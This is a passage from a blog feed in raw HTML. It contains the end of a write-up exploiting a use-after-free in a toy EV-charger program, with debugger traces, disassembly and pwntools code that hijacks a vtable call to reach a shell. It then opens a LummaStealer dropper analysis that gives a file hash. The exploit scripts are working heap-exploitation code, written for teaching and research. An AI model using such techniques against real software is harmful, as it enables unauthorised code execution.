==== EXECUTION FINISHED ====
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Rerun the program and create &lt;em&gt;one&lt;/em&gt; charge connector with option 1. You can choose either of the two connector types. For now, don’t give it a name.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Choice: 
&amp;gt;&amp;gt; 1
Type of charging gun?
1. Standard
2. High Ampacity
Choice: 
&amp;gt;&amp;gt; 1
Enter length of description (0 for no description): 
&amp;gt;&amp;gt; 
Charge gun added!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After the charger is created, exit the program. Notice it crashes hideously:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Choice: 
&amp;gt;&amp;gt; 6
Segmentation Fault
rax: 0x0000000000000000
rbx: 0x0000000000000000
rcx: 0x0000000000000000
rdx: 0x00007fffffffeca0
rsi: 0x00007fffffffeca0
rdi: 0x00007fffffffec98
rbp: 0x00007fffffffecc0
rsp: 0x00007fffffffec80
rip: 0x000000000040205e
r8:  0x00007fffffffed93
r9:  0x0000000000000000
r10: 0x0000000000000006
r11: 0x00007f000085ba30
r12: 0x00007f0000baf718
r13: 0x0000000000000007
r14: 0x00007f0000bb4708
r15: 0x00007f0000bb0d80
fs:  0x0000000000000000
gs:  0x0000000000000000
eflags: 0x0000000000000000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s inspect where the crash occurred:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wdb&amp;gt; backtrace
0x40205e in Charger::on_port_disconnected ()
0x401f23 in ChargePortManager::disconnect_port ()
0x401d91 in ChargePortManager::~ChargePortManager ()
0x40591e in Charger::~Charger ()
0x7f0000807161 in  ()

wdb&amp;gt; x/i $pc
0x40205e &amp;lt;Charger::on_port_disconnected+120&amp;gt;:  mov rax, qword ptr [rax]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Check out its source code:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;on_port_disconnected&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ChargeGun&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gun&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;guns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gun&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;uses_port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;gun&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plugged_in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, zoom out of the disassembly, around the area of the crash:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x40204e &amp;lt;+104&amp;gt;:  call    0x402696 &amp;lt;__normal_iterator&amp;lt;ChargeGun**, std::vector&amp;lt;ChargeGun*&amp;gt; &amp;gt;::operator*&amp;gt;
0x402053 &amp;lt;+109&amp;gt;:  mov     rax, qword [rax]
0x402056 &amp;lt;+112&amp;gt;:  mov     qword [rbp-0x10], rax
0x40205a &amp;lt;+116&amp;gt;:  mov     rax, qword [rbp-0x10]
0x40205e &amp;lt;+120&amp;gt;:  mov     rax, qword [rax]
0x402061 &amp;lt;+123&amp;gt;:  add     rax, 0x10
0x402065 &amp;lt;+127&amp;gt;:  mov     rax, qword [rax]
0x402068 &amp;lt;+130&amp;gt;:  mov     ecx, dword [rbp-0x3c]
0x40206b &amp;lt;+133&amp;gt;:  mov     rdx, qword [rbp-0x10]
0x40206f &amp;lt;+137&amp;gt;:  mov     esi, ecx
0x402071 &amp;lt;+139&amp;gt;:  mov     rdi, rdx
0x402074 &amp;lt;+142&amp;gt;:  call    rax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CALL RAX&lt;/code&gt; command should stand out as the virtual call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;on_port_disconnected&lt;/code&gt;. We can backtrack some of the other steps to make sense of the behavior:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;+104&amp;gt;:  call    0x402696 &amp;lt;__normal_iterator&amp;lt;ChargeGun**, std::vector&amp;lt;ChargeGun*&amp;gt; &amp;gt;::operator*&amp;gt;
&amp;lt;+109&amp;gt;:  mov     rax, qword [rax]      ;
&amp;lt;+112&amp;gt;:  mov     qword [rbp-0x10], rax ; 
&amp;lt;+116&amp;gt;:  mov     rax, qword [rbp-0x10] ; Address of charger
&amp;lt;+120&amp;gt;:  mov     rax, qword [rax]      ; charger-&amp;gt;vtable
&amp;lt;+123&amp;gt;:  add     rax, 0x10             ; charger-&amp;gt;vtable[0x10]
&amp;lt;+127&amp;gt;:  mov     rax, qword [rax]      ; charger-&amp;gt;vtable[0x10]-&amp;gt;uses_port
&amp;lt;+130&amp;gt;:  mov     ecx, dword [rbp-0x3c] ; 
&amp;lt;+133&amp;gt;:  mov     rdx, qword [rbp-0x10] ; 
&amp;lt;+137&amp;gt;:  mov     esi, ecx              ; Value of p
&amp;lt;+139&amp;gt;:  mov     rdi, rdx              ; Address of charger
&amp;lt;+142&amp;gt;:  call    rax                   ; call ChargeGunBase::uses_port()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can see it’s failing to fetch the address of the charger, a side effect of the UAF condition. You can break here, restart the application, and remove a connector (option 2) to see the expected behavior and trace to the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;on_port_disconnected&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 1: 0x40205e, Charger::on_port_disconnected+120

wdb&amp;gt; x/8i $pc
0x40205e &amp;lt;Charger::on_port_disconnected+120&amp;gt;:  mov rax, qword ptr [rax]
0x402061 &amp;lt;Charger::on_port_disconnected+123&amp;gt;:  add rax, 0x10
0x402065 &amp;lt;Charger::on_port_disconnected+127&amp;gt;:  mov rax, qword ptr [rax]
0x402068 &amp;lt;Charger::on_port_disconnected+130&amp;gt;:  mov ecx, dword ptr [rbp - 0x3c]
0x40206b &amp;lt;Charger::on_port_disconnected+133&amp;gt;:  mov rdx, qword ptr [rbp - 0x10]
0x40206f &amp;lt;Charger::on_port_disconnected+137&amp;gt;:  mov esi, ecx
0x402071 &amp;lt;Charger::on_port_disconnected+139&amp;gt;:  mov rdi, rdx
0x402074 &amp;lt;Charger::on_port_disconnected+142&amp;gt;:  call rax

wdb&amp;gt; print $rax
$3 = 0x61cea0

wdb&amp;gt; x/x $rax
0x61cea0: 0x00608d20

wdb&amp;gt; x/x 0x00608d20+0x10
0x608d30: 0x00401bdc

wdb&amp;gt; x/x 0x00401bdc
0x401bdc: 0xe5894855

wdb&amp;gt; x/i 0x00401bdc
0x401bdc &amp;lt;StandardChargeGun::uses_port+0&amp;gt;:    push rbp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here, you can see we created a StandardChargeGun subtype, so that’s where the function resolves. Additionally, you’ll notice that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChargeGun::uses_port&lt;/code&gt; has no debugger labels, so you’ll need to pay attention to the subclass implementations. The fact that it maps to a common supertype is important to keep in mind.&lt;/p&gt;

&lt;p&gt;Now that we better understand the &lt;em&gt;intended behavior&lt;/em&gt; of this method, let’s circle back to the actual, problematic behavior. We proved that the UAF condition can manifest simply by creating a charge plug. If we control the vtable, we could control the code pointed-to in the call to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChargeGun::uses_port&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;As noted earlier, there is some sparse indication that this binary is using some form of GLIBC 2.27:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wdb&amp;gt; info proc mappings
...
0x7f0000000000-0x7f0000029000 r-x ld-2.27.so
0x7f0000029000-0x7f000002b000 rw-
0x7f000002b000-0x7f000002e000 rw-
0x7f0000229000-0x7f000022a000 r-- ld-2.27.so
0x7f000022a000-0x7f000022c000 rw- ld-2.27.so
...
0x7f00007c4000-0x7f00009ab000 r-x libc-2.27.so
0x7f00009ab000-0x7f0000bab000 --- libc-2.27.so
0x7f0000bab000-0x7f0000baf000 r-- libc-2.27.so
0x7f0000baf000-0x7f0000bb1000 rw- libc-2.27.so
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can recall the tcache behavior and how the use of character buffers facilitates arbitrary executions. As it turns out, we have some opportunity to abuse this if we look to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChargeGun::description&lt;/code&gt; field:&lt;/p&gt;

&lt;div class=&quot;language-c++ highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ChargeGun&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nl&quot;&gt;public:&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;ChargeGun&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plugged_in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ChargeGun&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;delete&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;You’ll notice that neither supertype has a method to safely handle or sanitize the description. Instead, as a public field, other functions can directly read and write that value. Only the supertype’s destructor plays any role in attempting to handle its destruction; but, as we will see in a bit, the behavior as defined is insufficient.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChargeGun::description&lt;/code&gt; is initialized in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;add_gun&lt;/code&gt; function body:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void add_gun() {
    ...
    
    ChargeGun* ngun;
    ...
    
    if (dlen) {
        ngun-&amp;gt;description = new char[dlen+1];
        printf(&quot;Enter description (manufacturer, ampacity, etc...): &quot;);
        fgets(ngun-&amp;gt;description, dlen+1, stdin);
        ...
    }
    ...
    charger.guns.push_back(ngun);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Additionally, we know that each charge plug’s destructor is invoked under two conditions: when the user explicitly removes it (option 2), or when the vector is destroyed in the Charger’s own destructor (bug). This gives us an opportunity to create a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChargeGun&lt;/code&gt;-sized buffer which is &lt;em&gt;free&lt;/em&gt;‘d after the user exits &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;; if we can create a tcache of user-controlled data, we can try to invoke the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Charger::debug_mode&lt;/code&gt; and get a shell.&lt;/p&gt;

&lt;p&gt;To control the value of RAX, we can play with loops of creating, and corresponding loops of destroying, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;description&lt;/code&gt; buffer. From analyzing the toy code earlier, we know that the vector’s internal size will equal the number of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;push_back&lt;/code&gt; calls multiplied by 8, the size of a 64-bit pointer. We can perform fuzzing exercises by creating different amounts of buffers, free-ing the first one (index &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt;), and allowing the UAF condition to take the spotlight.&lt;/p&gt;

&lt;p&gt;In this case, three is the magic number:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;create_iters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_iters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload_size&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create_iters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Our fuzz payload is at RAX.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Segmentation Fault
...

wdb&amp;gt; x/i $pc
0x402074 &amp;lt;Charger::on_port_disconnected+142&amp;gt;:  call rax

wdb&amp;gt; print $rax
$8 = 0x4141414141414141
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now, let’s modify the payload to send the address of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Chager::debug_mode&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wdb&amp;gt; print Charger::debug_mode
$9 = 0x402248
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can spray this address on each iteration of the loop:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;create_iters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;create_iters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;debug_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x402248&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug_addr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create_iters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;create_iters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This gives us a shell.&lt;/p&gt;</content><author><name></name></author><summary type="html">Ret2 did a two-part writeup about a pwn2own 2024 challenge, where they exploited an electrical vehicle charging station: the CHARX SEC-3100. Both the solution and the firmware (which is not encrypted) are available online at this time. The firmware is 32-bit ARM and runs in a Linux environment, and the updates are all squashfs’ed, ready to be flashed or unpacked. Their exploit relied on a use-after-free vulnerability, coupled with some interesting side effects from both the code and the standard library version used.</summary></entry><entry><title type="html">Analyzing LummaStealer in the wild</title><link href="http://localhost:4000/2025/07/17/lummastealer.html" rel="alternate" type="text/html" title="Analyzing LummaStealer in the wild" /><published>2025-07-17T00:00:00-04:00</published><updated>2025-07-17T00:00:00-04:00</updated><id>http://localhost:4000/2025/07/17/lummastealer</id><content type="html" xml:base="http://localhost:4000/2025/07/17/lummastealer.html">&lt;p&gt;Fake torrents have been a means to spread malware for well over a decade. The links get reported, but there’s no real way to prevent it aside from not torrenting at all. &lt;a href=&quot;https://www.reddit.com/r/sonarr/comments/1gmsjia/how_to_exclude_successfulcrab_releases_in_sonarr/&quot;&gt;A Reddit user explains&lt;/a&gt; their experience with a series of these, all of which have “SuccessfulCrab” in their titles:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Successfulcrab is actually a standard scene release tag but it’s being spoofed currently by people uploading these junk .zipx/.link/.arj files.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This led me to discover a LummaStealer dropper, which was disguised as one such torrent. It makes sense to see it since a &lt;a href=&quot;https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141b&quot;&gt;CISA report from May of this year&lt;/a&gt; calls out an increase in LummaC2 activity.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;LummaC2 malware is able to infiltrate victim computer networks and exfiltrate sensitive information, threatening vulnerable individuals’ and organizations’ computer networks across multiple U.S. critical infrastructure sectors. According to FBI information and trusted third-party reporting, this activity has been observed as recently as May 2025. The IOCs included in this advisory were associated with LummaC2 malware infections from November 2023 through May 2025.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The torrented file has the following SHA-256 hash:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4117b121704750560f2ca1620e70dbc11d89786623939b670e4f1872020dcff5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The filesize is almost 900 megabytes, so Virus Total could not scan it. At the time of writing, the hash had no results, either.&lt;/p&gt;

&lt;p&gt;If you look at the filename, you’ll see it ends with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.scr&lt;/code&gt; extension. This refers to Windows screensaver files. If you’ve ever ran “The Matrix” screensaver, you’ve probably used an SCR file.&lt;/p&gt;

&lt;p&gt;A lesser-known, interesting fact about SCR files is that they are actually x86 (32-bit) executables. We can confirm this using the magic bytes:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ file sample.scr
sample.scr: PE32 executable (GUI) Intel 80386, for MS Windows, 5 sections
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The icing on the cake is that the binary uses the VLC media player icon, which makes it look like a media file to anyone who uses that software. The attack likely relies on the user double-clicking it thinking that it will open with VLC. (Spoiler: it will not.)&lt;/p&gt;

&lt;p&gt;We can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; to dump some useful preliminary information:&lt;/p&gt;

